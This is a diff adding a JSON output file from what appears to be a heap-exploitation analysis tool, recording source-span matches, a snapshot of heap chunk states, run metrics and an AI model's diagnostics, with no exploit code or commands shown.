+        "fingerprint": "9fd0346feb1612fd",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_ae8c17409a548a17",
+        "start": 1659,
+        "end": 1685,
+        "line": 57,
+        "end_line": 57,
+        "fingerprint": "9f27d68db7980949",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_6c0ff2335945f490",
+        "start": 1742,
+        "end": 1749,
+        "line": 60,
+        "end_line": 60,
+        "fingerprint": "0e5784c303e6ef12",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_6077e36bae900344",
+        "start": 1751,
+        "end": 1790,
+        "line": 61,
+        "end_line": 61,
+        "fingerprint": "f1e885d3b908095a",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_278f3b18a4634d4d",
+        "start": 1834,
+        "end": 1847,
+        "line": 64,
+        "end_line": 64,
+        "fingerprint": "e404eb777f7b9384",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_9c1b33c1a91f1cb9",
+        "start": 1849,
+        "end": 1862,
+        "line": 65,
+        "end_line": 65,
+        "fingerprint": "efa89a8095920bff",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_570748818e8340a6",
+        "start": 1864,
+        "end": 1879,
+        "line": 66,
+        "end_line": 66,
+        "fingerprint": "6c9ebffa91899fcb",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_cf771697336b7cbb",
+        "start": 1881,
+        "end": 1891,
+        "line": 67,
+        "end_line": 67,
+        "fingerprint": "df23c9182cc27a04",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_5e54192f39f9ffd6",
+        "start": 1898,
+        "end": 1918,
+        "line": 69,
+        "end_line": 69,
+        "fingerprint": "6d112cb2fccb1661",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_698b8ec8fd9b31c8",
+        "start": 1931,
+        "end": 1939,
+        "line": 70,
+        "end_line": 70,
+        "fingerprint": "464d50fda52c6a4c",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_b6b6bd3b8d3ab96c",
+        "start": 1920,
+        "end": 1961,
+        "line": 70,
+        "end_line": 70,
+        "fingerprint": "2ae92976003a92b4",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_ea9bb17a9138ef42",
+        "start": 2123,
+        "end": 2161,
+        "line": 77,
+        "end_line": 77,
+        "fingerprint": "dc531981e3de1f90",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_278f3b18a4634d4d",
+        "start": 2163,
+        "end": 2176,
+        "line": 78,
+        "end_line": 78,
+        "fingerprint": "e404eb777f7b9384",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_5a5d96c6fe2f5c23",
+        "start": 2178,
+        "end": 2191,
+        "line": 79,
+        "end_line": 79,
+        "fingerprint": "f9fa829b49f9ae15",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_cacbdd4384f658cb",
+        "start": 2203,
+        "end": 2220,
+        "line": 82,
+        "end_line": 82,
+        "fingerprint": "b6fb46edc662992f",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_e0233a49bed36572",
+        "start": 2222,
+        "end": 2237,
+        "line": 83,
+        "end_line": 83,
+        "fingerprint": "eedd81025c613b2a",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_95c1e86fd252f77f",
+        "start": 2253,
+        "end": 2261,
+        "line": 84,
+        "end_line": 84,
+        "fingerprint": "f080dd44d277b738",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_f6adfe1dc1b8bce2",
+        "start": 2263,
+        "end": 2308,
+        "line": 85,
+        "end_line": 85,
+        "fingerprint": "3a1219cb36eb29b3",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_d11f5b5900c12fb4",
+        "start": 2374,
+        "end": 2398,
+        "line": 90,
+        "end_line": 90,
+        "fingerprint": "14c90cddbfc8125e",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_846a7e5328eb39f1",
+        "start": 2462,
+        "end": 2473,
+        "line": 94,
+        "end_line": 94,
+        "fingerprint": "bc04ec34009d46b6",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_49de25e329bf6c09",
+        "start": 2475,
+        "end": 2486,
+        "line": 95,
+        "end_line": 95,
+        "fingerprint": "1caf4466f5b28442",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_1418fd7d5469e069",
+        "start": 2488,
+        "end": 2501,
+        "line": 96,
+        "end_line": 96,
+        "fingerprint": "219731a9b5a65f91",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_5dab58e0f721b5d9",
+        "start": 2503,
+        "end": 2516,
+        "line": 97,
+        "end_line": 97,
+        "fingerprint": "8509c8d86545512d",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_01bd9019c819041f",
+        "start": 2518,
+        "end": 2530,
+        "line": 98,
+        "end_line": 98,
+        "fingerprint": "ec51e27f72e86434",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_1b2cde9daecc41cc",
+        "start": 2537,
+        "end": 2559,
+        "line": 100,
+        "end_line": 100,
+        "fingerprint": "89453c2dfb5fdca4",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_f2282c453f729ec5",
+        "start": 2613,
+        "end": 2664,
+        "line": 104,
+        "end_line": 104,
+        "fingerprint": "9018a469362bc451",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_b19a4852c6c44ef0",
+        "start": 2666,
+        "end": 2676,
+        "line": 105,
+        "end_line": 105,
+        "fingerprint": "55f942361e037284",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_8ad8cb3bf7b55bbf",
+        "start": 2678,
+        "end": 2687,
+        "line": 106,
+        "end_line": 106,
+        "fingerprint": "d979deacc2ac46f0",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_035ad49cbf561aeb",
+        "start": 2689,
+        "end": 2711,
+        "line": 107,
+        "end_line": 107,
+        "fingerprint": "de66692116674156",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_49de25e329bf6c09",
+        "start": 2718,
+        "end": 2729,
+        "line": 109,
+        "end_line": 109,
+        "fingerprint": "1caf4466f5b28442",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_01bd9019c819041f",
+        "start": 2731,
+        "end": 2743,
+        "line": 110,
+        "end_line": 110,
+        "fingerprint": "ec51e27f72e86434",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_5edc80b11f47617f",
+        "start": 3031,
+        "end": 3047,
+        "line": 126,
+        "end_line": 126,
+        "fingerprint": "6c05f67fe5a522e0",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      }
+    ],
+    "branches": [],
+    "diagnostics": [
+      {
+        "severity": "info",
+        "code": "runtime_assertion",
+        "message": "assert 是运行时约束，静态分析保留后续路径但不假定条件成立。",
+        "start": 1963,
+        "end": 2017,
+        "line": 71,
+        "suggestion": ""
+      }
+    ],
+    "symbols": {
+      "std": "b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'",
+      "custom": "b'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/'",
+      "i": "7"
+    }
+  },
+  "snapshot": {
+    "step": 57,
+    "aborted": false,
+    "chunks": {
+      "A": {
+        "address": "heap_base+0x290",
+        "user_address": "heap_base+0x2a0",
+        "chunk_size": "0x110",
+        "lifecycle": "stale",
+        "bin_location": "reused by P",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "B": {
+        "address": "heap_base+0x3a0",
+        "user_address": "heap_base+0x3b0",
+        "chunk_size": "0x110",
+        "lifecycle": "stale",
+        "bin_location": "reused by O",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "C": {
+        "address": "heap_base+0x4b0",
+        "user_address": "heap_base+0x4c0",
+        "chunk_size": "0x110",
+        "lifecycle": "stale",
+        "bin_location": "reused by N",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "D": {
+        "address": "heap_base+0x5c0",
+        "user_address": "heap_base+0x5d0",
+        "chunk_size": "0x110",
+        "lifecycle": "stale",
+        "bin_location": "reused by M",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "E": {
+        "address": "heap_base+0x6d0",
+        "user_address": "heap_base+0x6e0",
+        "chunk_size": "0x110",
+        "lifecycle": "stale",
+        "bin_location": "reused by L",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "F": {
+        "address": "heap_base+0x7e0",
+        "user_address": "heap_base+0x7f0",
+        "chunk_size": "0x110",
+        "lifecycle": "stale",
+        "bin_location": "reused by K",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "G": {
+        "address": "heap_base+0x8f0",
+        "user_address": "heap_base+0x900",
+        "chunk_size": "0x110",
+        "lifecycle": "stale",
+        "bin_location": "reused by J",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "H": {
+        "address": "heap_base+0xa00",
+        "user_address": "heap_base+0xa10",
+        "chunk_size": "0x110",
+        "lifecycle": "stale",
+        "bin_location": "reused by I",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "I": {
+        "address": "heap_base+0xa00",
+        "user_address": "heap_base+0xa10",
+        "chunk_size": "0x110",
+        "lifecycle": "allocated",
+        "bin_location": "",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "J": {
+        "address": "heap_base+0x8f0",
+        "user_address": "heap_base+0x900",
+        "chunk_size": "0x110",
+        "lifecycle": "allocated",
+        "bin_location": "",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "K": {
+        "address": "heap_base+0x7e0",
+        "user_address": "heap_base+0x7f0",
+        "chunk_size": "0x110",
+        "lifecycle": "allocated",
+        "bin_location": "",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "L": {
+        "address": "heap_base+0x6d0",
+        "user_address": "heap_base+0x6e0",
+        "chunk_size": "0x110",
+        "lifecycle": "allocated",
+        "bin_location": "",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "M": {
+        "address": "heap_base+0x5c0",
+        "user_address": "heap_base+0x5d0",
+        "chunk_size": "0x110",
+        "lifecycle": "allocated",
+        "bin_location": "",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "N": {
+        "address": "heap_base+0x4b0",
+        "user_address": "heap_base+0x4c0",
+        "chunk_size": "0x110",
+        "lifecycle": "allocated",
+        "bin_location": "",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "O": {
+        "address": "heap_base+0x3a0",
+        "user_address": "heap_base+0x3b0",
+        "chunk_size": "0x110",
+        "lifecycle": "allocated",
+        "bin_location": "",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "P": {
+        "address": "heap_base+0x290",
+        "user_address": "heap_base+0x2a0",
+        "chunk_size": "0x110",
+        "lifecycle": "allocated",
+        "bin_location": "",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "Q": {
+        "address": "heap_base+0xb10",
+        "user_address": "heap_base+0xb20",
+        "chunk_size": "0x390",
+        "lifecycle": "stale",
+        "bin_location": "reused by S",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "R": {
+        "address": "heap_base+0xea0",
+        "user_address": "heap_base+0xeb0",
+        "chunk_size": "0x390",
+        "lifecycle": "allocated",
+        "bin_location": "",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "S": {
+        "address": "heap_base+0xb10",
+        "user_address": "heap_base+0xb20",
+        "chunk_size": "0x390",
+        "lifecycle": "allocated",
+        "bin_location": "",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "T": {
+        "address": "heap_base+0x1230",
+        "user_address": "heap_base+0x1240",
+        "chunk_size": "0x390",
+        "lifecycle": "allocated",
+        "bin_location": "",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "U": {
+        "address": "heap_base+0x15c0",
+        "user_address": "heap_base+0x15d0",
+        "chunk_size": "0xd0",
+        "lifecycle": "allocated",
+        "bin_location": "",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "V": {
+        "address": "heap_base+0x1690",
+        "user_address": "heap_base+0x16a0",
+        "chunk_size": "0xb0",
+        "lifecycle": "stale",
+        "bin_location": "reused by Z",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "W": {
+        "address": "heap_base+0x1740",
+        "user_address": "heap_base+0x1750",
+        "chunk_size": "0x110",
+        "lifecycle": "allocated",
+        "bin_location": "",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "X": {
+        "address": "heap_base+0x1850",
+        "user_address": "heap_base+0x1860",
+        "chunk_size": "0x110",
+        "lifecycle": "allocated",
+        "bin_location": "",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "Y": {
+        "address": "heap_base+0x1960",
+        "user_address": "heap_base+0x1970",
+        "chunk_size": "0xb0",
+        "lifecycle": "stale",
+        "bin_location": "reused by AA",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "Z": {
+        "address": "heap_base+0x1690",
+        "user_address": "heap_base+0x16a0",
+        "chunk_size": "0xb0",
+        "lifecycle": "allocated",
+        "bin_location": "",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "AA": {
+        "address": "heap_base+0x1960",
+        "user_address": "heap_base+0x1970",
+        "chunk_size": "0xb0",
+        "lifecycle": "allocated",
+        "bin_location": "",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      }
+    },
+    "bins": {
+      "tcache": {},
+      "fastbins": {},
+      "smallbins": {},
+      "largebins": {},
+      "unsorted": []
+    },
+    "warnings": []
+  },
+  "assertions": [],
+  "metrics": {
+    "operation_count": 57,
+    "expected_operation_count": 0,
+    "semantic_exact": 0,
+    "semantic_total": 57,
+    "assertions_passed": 0,
+    "assertions_total": 0,
+    "static_valid": true,
+    "ai_candidates": 0,
+    "ai_raw_candidates": 0,
+    "ai_validator_rejected": 0,
+    "ai_replay_accepted": 0,
+    "ai_replay_rejected": 0
+  },
+  "ai": {
+    "generation": 12,
+    "source_hash": "a31b426a91241cd5de8551867155986a85d6c8e6fed7347d4a516e7dbfee913f",
+    "proposals": [],
+    "diagnostics": [
+      "输入预算已精简重复 Heap IR；完整 EXP 未截断。",
+      "No allocator events or heap corruption rules need to be added based on static analysis and exp_source.",
+      "All operations in the source code are already correctly represented in the timeline."
+    ],
+    "elapsed_ms": 17687,
+    "model": "qwen3-coder-30b-a3b-instruct",
+    "cached": false,
+    "prompt_version": "pwncraft-heap-ai-v10-negative-rules",
+    "candidate_audit": []
+  },
+  "strict_previews": [],
+  "feedback_compilation": [],
+  "promotion_policy": {
+    "mode": "aggressive",
+    "minimum_positive_cases": 1,
+    "require_holdout": false,
+    "confidence_threshold": 0.8,
+    "maximum_rejected_cases": 0,
+    "rule_source": "qwen-strict-auto:aggressive"
+  },
+  "elapsed_s": 18.078
+}
